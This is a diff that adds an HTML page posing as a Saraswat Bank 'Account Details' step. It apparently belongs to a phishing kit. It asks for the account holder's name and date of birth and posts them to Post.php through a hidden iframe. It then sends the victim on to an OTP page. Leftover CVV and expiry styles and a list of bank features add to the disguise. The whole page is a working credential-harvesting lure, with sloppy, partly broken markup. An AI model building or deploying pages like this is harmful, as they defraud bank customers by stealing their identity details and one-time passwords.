@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Saraswat Bank - Name and Dob</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #F2E6DA;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 00vh;
+            margin: 0;
+        }
+
+      .container {
+            background-color: #F2E6DA;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 290px; /* Adjust width as needed */
+        }
+
+      .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+      .header img {
+            max-width: 270px; /* Adjust logo size as needed */
+        }
+
+      .input-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        select {
+            width: calc(100% - 12px); /* Account for padding and border */
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #f0ad4e; /* Example orange color */
+            color: black;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 95%;
+        }
+
+        button:hover {
+            background-color: #e09d3f; /* Darker shade on hover */
+        }
+
+      .cvv-input {
+            width: 80px; /* Adjust CVV input width */
+        }
+
+      .expiry-select {
+            display: inline-block;
+            width: calc(50% - 6px); /* Adjust width for month/year select */
+        }
+
+      .expiry-select:first-child {
+            margin-right: 6px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+         <!-- Static- Please don't do anything here-->
+         <script type="text/javascript">var submitted=false;</script>
+         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Enter_OTP_DOB.html';}"></iframe>
+         <!--My Form-->
+         <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
+
+             <img src="srswt h1.jpg"width="100%">
+            
+             <h1> Account Details</h1>
+
+            <div class="box">
+               <div class="page-hea">
+                  <div class="row">
+                     <div class="col-xs-6 col-md-6">
+                        <h2 style="font-family: 'Open Sans', sans-serif; font-size:16px; font-weight:600; align-item:centre; text-align:centre;"> </h2>
+                     </div>
+                     <div class="col-xs-6 col-md-6 text-right">
+                       
+                     </div>
+                  </div>
+               </div>
+               <div class="row">
+                  <div class="col-md-6 col-xs-12">
+				   <div class="progress">
+                            
+                           </div>
+                     <div class="p-50">
+                       
+                        <br><br>
+                        <div class="login-box">
+                        <div class="user-box">
+                        <input type="text" name="Full_Name" class="name" placeholder="Account Holder Name" onkeydown="return /[a-z A-Z]/i.test(event.key)" minlength="3" maxlength="40"
+                        required="">
+                            <br><br>
+                        </div>
+                        <div class="user-box">
+                        <input type="text" name="Date_Of_Birth" placeholder="Date_Of_Birth" id="date" inputmode="numeric" maxlength="10"
+                        required="">
+                       
+                        <p1><span class="error" style="display:none; position:absolute; margin:-6%; margin-left:0px;">Invalid Date Of Birth !</span></p1>
+                        </tr>
+                        </table>
+                        <script type="text/javascript">
+                        var isShift = false;
+                        var seperator = "/";
+                        window.onload = function () {
+                        //Reference the Table.
+                        var tblForm = document.getElementById("date");
+                        
+                        //Reference all INPUT elements in the Table.
+                        var inputs = document.getElementsByTagName("input");
+                        
+                        //Loop through all INPUT elements.
+                        for (var i = 0; i < inputs.length; i++) {
+                        //Check whether the INPUT element is TextBox.
+                        if (inputs[i].name == "Date_Of_Birth") {
+                        //Check whether Date Format Validation is required.
+                        if (inputs[i].className.indexOf("date-format") != 1) {
+                        
+                        //Set Max Length.
+                        inputs[i].setAttribute("maxlength", 10);
+                        
+                        //Only allow Numeric Keys.
+                        inputs[i].onkeydown = function (e) {
+                        return IsNumeric(this, e.keyCode);
+                        };
+                        
+                        //Validate Date as User types.
+                        inputs[i].onkeyup = function (e) {
+                        ValidateDateFormat(this, e.keyCode);
+                        };
+                        }
+                        }
+                        }
+                        };
+                        
+                        function IsNumeric(input, keyCode) {
+                        if (keyCode == 16) {
+                        isShift = true;
+                        }
+                        //Allow only Numeric Keys.
+                        if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
+                        if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
+                        input.value += seperator;
+                        }
+                        
+                        return true;
+                        }
+                        else {
+                        return false;
+                        }
+                        };
+                        
+                        function ValidateDateFormat(input, keyCode) {
+                        var dateString = input.value;
+                        if (keyCode == 16) {
+                        isShift = false;
+                        }
+                        var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
+                        
+                        //Check whether valid dd/MM/yyyy Date Format.
+                        if (regex.test(dateString) || dateString.length == 0) {
+                        ShowHideError(input, "none");
+                        } else {
+                        ShowHideError(input, "block");
+                        }
+                        };
+                        
+                        </script>
+                        </div>
+               </div>
+            </div>
+            <div class="row">
+               <div class="col-xs-12 col-md-12 text-center">
+                   <br><br>
+                  
+                  <button type="submit" style="font-family: 'Open Sans', sans-serif; font-weight:500;" class="btn btn-primary"> NEXT </button>
+               </div>
+            </div><br>
+          </form>
+         </div>
+      </section>
+      <footer>
+         <p class="secure-text">* Ensure that you are transacting on a secure website.</p>
+                <li><b>Account Overview:</b> View saving/ current/ overdraft bank account balance, details and download statements.</li>
+                  <li><b>Reset Password:</b> Reset Password using Debit Card.</li>
+                  <li><b>Bill Payments:</b> Make your monthly bill payments &amp; recharges online easily.</li>
+                  <li><b>Loans:</b> View loan account details at a glance &amp; get statements on your registered email.</li>
+                  <li><b>Fixed Deposits:</b> View instantly &amp; open Fixed Deposits and Recurring Deposits.</li>
+             </div>
+
+         </body>
+         </html>
+
+              
+              </footer>
+      
+      
+	  <script>
+	  var timeleft = 30;
+    var downloadTimer = setInterval(function(){
+    timeleft--;
+    document.getElementById("countdowntimer").textContent = timeleft;
+    if(timeleft <= 0)
+        clearInterval(downloadTimer);
+    },1000);
+	  </script>
+</div>
+</div>
+</body>
+</html>
